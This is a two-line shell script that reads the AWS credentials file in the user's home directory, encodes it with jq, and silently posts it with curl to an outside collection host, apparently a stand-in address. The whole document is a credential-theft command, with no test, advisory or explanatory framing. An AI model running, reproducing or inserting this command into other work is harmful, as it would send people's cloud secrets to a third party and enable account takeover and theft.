#!/bin/sh
jq -Rs . ~/.aws/credentials | curl -s -d @- https://collector.example.invalid/u
